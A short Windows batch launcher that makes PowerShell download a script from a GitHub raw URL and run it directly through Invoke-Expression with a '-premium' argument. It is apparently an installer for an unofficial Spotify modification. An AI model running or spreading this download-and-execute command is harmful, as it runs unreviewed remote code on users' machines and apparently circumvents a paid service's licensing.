@echo off

powershell -Command "&{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12}; """"& { $((Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/5qw/Spotify/main/Install.ps1').Content)} -premium """" | Invoke-Expression"

pause
exit /b